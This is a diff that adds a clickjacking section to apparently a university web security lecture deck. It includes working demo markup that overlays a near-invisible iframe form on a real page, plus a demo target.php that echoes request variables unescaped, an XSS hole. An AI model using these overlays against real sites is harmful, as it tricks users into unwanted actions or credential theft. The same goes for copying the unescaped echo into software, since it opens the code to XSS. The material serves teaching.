@@ -53,6 +53,7 @@
 &nbsp;  
 [Introduction](#/intro)  
 [Cross site scripting (XSS)](#/xss)  
+[Clickjacking](#/clickjacking)  
 </textarea></section>
   
 <!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
@@ -491,30 +492,277 @@ Output: Hello Aaron! Your account balance is 1000000
 
 <section>
 
-<section data-markdown id="topic2" class="center"><textarea data-template>
-# Topic 2
+<section data-markdown id="clickjacking" class="center"><textarea data-template>
+# Clickjacking
 </textarea></section>
     
 <section data-markdown data-separator="^\n\n\n"><textarea data-template>
-## ...
-</textarea></section>
+<h2>Clickjacking Overview</h2>
+<img src='http://www.cs.virginia.edu/~asb2t/duimg/n25/image4.png' style="float:left;width:300px">
+<img src='http://www.cs.virginia.edu/~asb2t/duimg/n25/image6.png' style="float:right;width:300px">
+<br clear='all'>
 
+- Basic idea is to overlay a valid page with an invisible, malicious page
+- The user sees the real page, and thinks s/he is interacting with it
+- In reality, the invisible malicious page is being interacted with
+
+
+
+<!-- .slide: class="smaller-pre wide-pre" -->
+## target.php
+```html
+<!DOCTYPE html>
+<html><head>
+  <title>Target desitnation page</title>
+</head>
+<body>
+  <h2>Target destination page</h2>
+
+  <p>The GET variables are:</p>
+  <ul>
+<?php 
+  $keys = array_keys($_GET); 
+  asort($keys); 
+  foreach ($keys as $k) 
+    echo "<li><b>$k:</b> " . $_GET[$k] . "</li>"; 
+?>
+    </ul>
+
+  <p>The POST variables are:</p>
+  <ul>
+<?php $keys = array_keys($_POST); asort($keys); foreach ($keys as $k) echo "<li><b>$k:</b> " . $_POST[$k] . "</li>"; ?>
+    </ul>
+
+  <p>The SERVER variables are:</p>
+  <ul>
+<?php $keys = array_keys($_SERVER); asort($keys); foreach ($keys as $k) echo "<li><b>$k:</b> " . $_SERVER[$k] . "</li>"; ?>
+    </ul>
+
+</body></html>
+```
+
+
+
+## Note
+- The pages in this column will only work properly when viewed through a https:// link
+
+
+
+
+## iframes
+- Includes another web page inside a framed element
+- Used for:
+  - Embedding videos
+  - Tweets on ~~Twitter~~ X
+  - Etc.
+- On the next slide:
+```html
+<iframe id="A" style="width:100%;height:600px" 
+        src="//www.xkcd.com"></iframe>
+```
+
+
+
+## xkcd in an iframe
+<iframe id="A" style="width:100%;height:400px;left:20px" src="//www.xkcd.com"></iframe>
+
+<div style="margin-top:450px">
+
+- Code:
+```html
+<iframe id="A" style="width:100%;height:300px" 
+        src="//www.xkcd.com"></iframe>
+```
+
+</div>
+
+
+
+## Stacking iframes
+We can stack one iframe on top of another:
+```html
+<style>
+  #A { width:100%; height:600px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:100px; top:100px; }
+  #B { width:100%; height:600px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:200px; top:200px; }
+</style>
+<iframe id="A" src="//www.xkcd.com"></iframe>
+<iframe id="B" src="//nasa.gov"></iframe>
+```
+
+
+
+## Stacking iframes
+<div>
+<style>
+  #A { width:100%; height:600px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:100px; top:100px; }
+  #B { width:100%; height:600px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:200px; top:200px; }
+</style>
+<iframe id="A" src="//www.xkcd.com"></iframe>
+<iframe id="B" src="//nasa.gov"></iframe>
+</div>
+
+
+
+## Stacking iframes w/opacity 0.7
+<div>
+<style>
+  #C { width:100%; height:600px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:100px; top:100px; }
+  #D { width:100%; height:600px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:200px; top:200px; opacity:0.7 }
+</style>
+<iframe id="C" src="//www.xkcd.com"></iframe>
+<iframe id="D" src="//nasa.gov"></iframe>
+</div>
+
+
+
+## HTML in an iframe
+- If we want to put the following in an iframe:
+```html
+<iframe><html><body><p>hello world</p></body></html></iframe>
+```
+- We have to encode it as such:
+  - Replacing `<` with %3c, and `>` with %3e
+```html
+data:text/html;charset=utf-8,%3chtml%3e%3cbody%3e%3cp%3ehello world%3c/p%3e%3c/body%3e%3c/html%3e
+```
+- And then set as the src attribute:
+```html
+<iframe src="..."></iframe>
+```
+- Result:
+
+<iframe style="background-color:white;height:100px" src="data:text/html;charset=utf-8,%3chtml%3e%3cbody%3e%3cp%3ehello world%3c/p%3e%3c/body%3e%3c/html%3e"></iframe>
+
+
+
+## Clickjacking goal
+- We want them to click on some specific area of the *actual* page
+- Reasons:
+  - Likejacking: they are clicking on the 'like' button of a social media page (that they are already logged into)
+  - Form clickjacking: they are clicking on the 'submit' button of a form with pre-filled out data
+  - Lots more
+
+
+
+<!-- .slide: class="small-pre wide-pre" -->
+## Overlay page
+- Our HTML content:
+```html
+<form action='//www.cs.virginia.edu/~asb2t/target.php?get_param=foo' 
+      method='POST'>
+  <input type='hidden' id='post_param' name='postparam' value='bar'>
+  <input type='submit' value='click me! click me!'>
+</form>
+```
+- Result:
+<form action='//www.cs.virginia.edu/~asb2t/target.php?get_param=foo' method='POST'>
+  <input type='hidden' id='post_param' name='postparam' value='bar'>
+  <input type='submit' value='click me! click me!'>
+</form>
+
+
+
+## Clickjacking page
+<div>
+<style>
+  #E { width:100%; height:300px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:100px; top:100px; }
+  #F { width:100%; height:300px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:220px; top:190px; opacity:0.9 }
+</style>
+<iframe id="E" src="//www.xkcd.com"></iframe>
+<iframe id="F" style="background-color:white" src="data:text/html;charset=utf-8,%3chtml%3e%3cbody%3e%3cform action='https://www.cs.virginia.edu/~asb2t/target.php?get_param=foo' method='POST'%3e%3cinput type='hidden' id='post_param' name='postparam' value='bar'%3e%3cinput type='submit' value='click me! click me!'%3e%3c/form%3e%3c/body%3e%3c/html%3e"></iframe>
+</div>
+<div style="margin-top:450px">
+
+- Success!
+
+</div>
+
+
+
+## Clickjacking page, more opacity
+<div>
+<style>
+  #I { width:100%; height:300px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:100px; top:100px; }
+  #J { width:100%; height:300px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:220px; top:190px; opacity:0.1 }
+</style>
+<iframe id="I" src="//www.xkcd.com"></iframe>
+<iframe id="J" style="background-color:white" src="data:text/html;charset=utf-8,%3chtml%3e%3cbody%3e%3cform action='https://www.cs.virginia.edu/~asb2t/target.php?get_param=foo' method='POST'%3e%3cinput type='hidden' id='post_param' name='postparam' value='bar'%3e%3cinput type='submit' value='click me! click me!'%3e%3c/form%3e%3c/body%3e%3c/html%3e"></iframe>
+</div>
+<div style="margin-top:450px">
+
+- This is 0.1 opacity (0.0 is invisible)
+- Click on 'Feed Email'
+- With full opacity, the result of the click is not visible either
+
+</div>
+
+
+
+<h2 class="r-fit-text">Clickjacking attempt, link version</h2>
+<div>
+<style>
+  #G { width:100%; height:300px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:100px; top:100px; }
+  #H { width:100%; height:300px; 
+       max-height:unset; max-width:unset;
+       position:absolute; left:200px; top:200px; opacity:0.9 }
+</style>
+<iframe id="G" src="//www.xkcd.com"></iframe>
+<iframe id="H" style="background-color:white" src="data:text/html;charset=utf-8,%3chtml%3e%3cbody%3e%3ca href='https://www.cs.virginia.edu/~asb2t/target.php?get_param=foo'%3eclick me! click me!%3c/a%3e%3c/body%3e%3c/html%3e"></iframe>
+</div>
+<div style="margin-top:450px">
+
+- We can replace the button with a simple link
+  - This only allows GET parameters, though
+
+</div>
+
+
+
+## If multiple clicks are needed...
+- Have them play a "game" (like a CAPTCHA):
+![](http://www.cs.virginia.edu/~asb2t/duimg/n25/image13.png)
+- Each one they click on is one of the sequence of clicks
+
+
+
+## Stealing login credentials
+- Overlay a real page with your form:
+
+<img src='http://www.cs.virginia.edu/~asb2t/duimg/n25/image19.png' style="width:700px">
+
+
+
+## www.virginia.edu in an iframe:
+
+<iframe src="https://www.virginia.edu" style="width:100%; height:300px; max-height:unset; max-width:unset;"></iframe>
+
+- Why didn't it work?
+  - See the error in the developer console (Shift-Ctrl-C or Shift-Command-C)
+</textarea></section>
 </section>
 
-<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
-
-<section>
-
-<section data-markdown id="topic3" class="center"><textarea data-template>
-# Topic 3
-</textarea></section>
-    
-<section data-markdown data-separator="^\n\n\n"><textarea data-template>
-## ...
-</textarea></section>
-
-</section>
-	
 <!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
 	
 </div>
